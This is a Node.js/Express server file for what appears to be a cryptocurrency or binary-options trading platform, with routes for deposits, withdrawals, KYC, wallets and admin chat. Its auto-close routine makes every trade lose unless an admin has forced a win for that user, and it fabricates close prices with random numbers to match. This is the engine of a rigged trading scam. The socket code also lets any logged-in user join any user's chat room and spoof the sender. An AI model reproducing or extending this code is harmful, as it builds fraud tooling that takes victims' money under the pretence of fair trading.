const http = require("http");
const { Server } = require("socket.io");
require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const path = require("path");
const app = express();

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*"
  }
});

// ================= CONFIG =================
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;

// ================= MIDDLEWARE =================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));
app.use("/sounds", express.static("sounds"));

// ================= ROUTES =================

// 🔹 AUTH / USER
app.use("/api/auth", require("./routes/auth"));
app.use("/api/user", require("./routes/user"));
app.use("/api/wallet-info", require("./routes/wallet"));

// 🔹 CHAT
app.use("/api/chat", require("./routes/chat"));
app.use("/api/admin-chat", require("./routes/adminChat"));

// 🔹 TRADE
app.use("/api/trade", require("./routes/trade"));

// 🔹 KYC
app.use("/api/kyc", require("./routes/kyc"));

// 🔹 DEPOSIT (user)
app.use("/api/deposit", require("./routes/deposit"));

// 🔹 WITHDRAW (user)
app.use("/api/withdraw", require("./routes/withdraw"));
app.use("/api/withdraw-wallet", require("./routes/withdrawWallet"));
app.use("/api/admin", require("./routes/adminTradeSetting"));

// 🔹 ADMIN
app.use("/api/admin/users", require("./routes/adminUser"));
app.use("/api/admin/deposit", require("./routes/adminDeposit"));
app.use("/api/admin/withdraw", require("./routes/adminWithdraw"));
app.use("/api/admin/wallet-info", require("./routes/adminWallet"));

// 🔹 NOTIFICATION
app.use("/api/notifications", require("./routes/notification"));

// 🔹 UPLOAD
app.use("/api/upload", require("./routes/upload"));

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "LandingPage.html"));
});

// ================= HEALTH CHECK =================
app.get("/api/health", (req, res) => {
  res.json({
    status: "OK",
    message: "Server running"
  });
});

// ================= ADMIN STATS =================
const User = require("./models/User");

const jwt = require("jsonwebtoken");
const SECRET = process.env.JWT_SECRET;

if (!SECRET) {
  console.error("❌ JWT_SECRET is missing in .env");
  process.exit(1);
}

// 🔐 AUTH
function auth(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];

  if (!token) {
    return res.status(401).json({ message: "No token" });
  }

  try {
    const decoded = jwt.verify(token, SECRET);
    req.user = decoded;
    next();
  } catch {
    return res.status(401).json({ message: "Invalid token" });
  }
}

// 🔐 ADMIN ONLY
function adminOnly(req, res, next) {
  if (req.user.role !== "admin") {
    return res.status(403).json({ message: "Admin only" });
  }
  next();
}

app.get("/api/admin/stats", auth, adminOnly, async (req, res) => {
  try {
    const totalUsers = await User.countDocuments();

    res.json({
      totalUsers,
      activeUsers: 0
    });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// ================= CONNECT DB =================
mongoose.connect(MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch(err => {
    console.error("❌ MongoDB Error:", err);
    process.exit(1);
  });

// ================= DAILY RESET =================
function scheduleDailyReset() {
  const now = new Date();
  const next = new Date();

  next.setHours(24, 0, 0, 0);

  const timeout = next.getTime() - now.getTime();

  setTimeout(() => {
    resetWithdrawDaily();
    setInterval(resetWithdrawDaily, 24 * 60 * 60 * 1000);
  }, timeout);
}

async function resetWithdrawDaily() {
  try {
    console.log("🔄 Reset withdrawnToday...");
    await User.updateMany({}, { withdrawnToday: 0 });
    console.log("✅ Reset success");
  } catch (err) {
    console.error("❌ Reset error:", err);
  }
}

scheduleDailyReset();

// ================= AUTO CLOSE TRADE =================
const Order = require("./models/Order");
const TradeSetting = require("./models/TradeSetting");

async function autoCloseOrders() {
  try {
    const now = new Date();
    const openOrders = await Order.find({ status: "open" });

    for (const trade of openOrders) {
      const openTime = new Date(trade.openTime);
      const expireTime = new Date(openTime.getTime() + trade.duration * 60000);

      if (now < expireTime) continue;

      const user = await User.findById(trade.userId);

      const setting = await TradeSetting.findOne({
        userId: trade.userId,
        symbol: trade.symbol
      });

      let result = "lose";

      if (setting && setting.forceResult === "win") {
        result = "win";
      }

      trade.result = result;
      trade.status = "closed";
      trade.closeTime = new Date();

      if (result === "win") {
        if (trade.type === "BUY") {
          trade.closePrice = trade.openPrice + Math.random();
        } else {
          trade.closePrice = trade.openPrice - Math.random();
        }
      } else {
        if (trade.type === "BUY") {
          trade.closePrice = trade.openPrice - Math.random();
        } else {
          trade.closePrice = trade.openPrice + Math.random();
        }
      }

      if (result === "win") {
        const profit = trade.amount * (trade.percent / 100);
        user.balance += trade.amount + profit;
      }

      await trade.save();
      await user.save();

      console.log("✅ Auto closed:", trade._id, result);
    }

  } catch (err) {
    console.log("AUTO CLOSE ERROR:", err);
  }
}

setInterval(autoCloseOrders, 3000);

global.sendAdminUpdate = function(type, data) {
  console.log("🔥 REALTIME:", type);
  io.emit("admin_update", { type, data });
};

io.use((socket, next) => {
  try {
    const token = socket.handshake.auth?.token;

    if (!token) return next(new Error("No token"));

    const decoded = jwt.verify(token, SECRET);
    socket.user = decoded;

    next();
  } catch {
    return next(new Error("Unauthorized"));
  }
});

io.on("connection", (socket) => {
  console.log("🔥 Socket connected:", socket.id);

  // 🔥 JOIN ROOM
  socket.on("joinRoom", (userId) => {
    if (!userId) return;
    socket.join(userId);
    console.log("✅ Joined room:", userId);
  });

  // 🔥 SEND MESSAGE
  socket.on("sendMessage", async (data) => {
    try {
      const Chat = require("./models/Chat");

      const msg = await Chat.create({
        userId: data.userId,
        sender: data.sender,
        message: data.message,
        image: data.image || null,
        copyText: data.copyText || null,
        copyLabel: data.copyLabel || null,
        createdAt: new Date()
      });

      // 🔥 ส่งไปทั้งห้องเดียวกัน
      io.to(data.userId).emit("receiveMessage", msg);

      console.log("📩 Message sent:", data.userId);

    } catch (err) {
      console.error("SEND MESSAGE ERROR:", err);
    }
  });

});
// ================= START SERVER =================
server.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
